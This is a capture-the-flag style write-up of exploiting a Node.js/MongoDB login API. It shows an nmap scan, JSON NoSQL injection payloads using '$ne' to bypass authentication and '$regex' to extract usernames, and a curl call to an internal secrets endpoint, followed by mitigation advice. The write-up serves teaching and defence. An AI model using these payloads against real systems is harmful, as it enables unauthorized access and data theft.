---
title: "MongoDB NoSQL Injection & Data Exfiltration"
slug: "mongodb-nosql-injection"
category: "database-exploitation"
description: "Exploiting a NoSQL injection vulnerability in a Node.js application to bypass authentication and exfiltrate data from a MongoDB instance."
date: "2024-08-18"
---

## Overview

The target was a Node.js REST API backed by MongoDB. The authentication endpoint was vulnerable to NoSQL injection, allowing both authentication bypass and data exfiltration.

## Reconnaissance

```bash
nmap -sV -sC 10.10.14.75
```

| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | Node.js Express |
| 27017 | MongoDB | 6.0.4 (filtered) |

## Identifying the Vulnerability

The login endpoint accepted JSON:

```json
POST /api/auth/login
{
  "username": "admin",
  "password": "test"
}
```

Testing with a NoSQL operator:

```json
{
  "username": "admin",
  "password": { "$ne": "" }
}
```

This returned a valid JWT token — authentication bypassed.

## Data Exfiltration

### Enumerating Users

Using `$regex` injection to extract usernames character by character:

```json
{
  "username": { "$regex": "^a" },
  "password": { "$ne": "" }
}
```

Automated with a Python script to brute-force each character position.

### Extracting the Flag

The flag was stored in a `secrets` collection. Using the admin JWT, I accessed the internal API:

```bash
curl -H "Authorization: Bearer <token>" http://10.10.14.75/api/internal/secrets
```

## Mitigation

- Sanitise all user input — reject objects where strings are expected
- Use `mongoose` schema validation
- Implement rate limiting on authentication endpoints
- Never expose MongoDB to the network without authentication

## Tools Used

- Burp Suite
- Python (requests library)
- curl
- jq
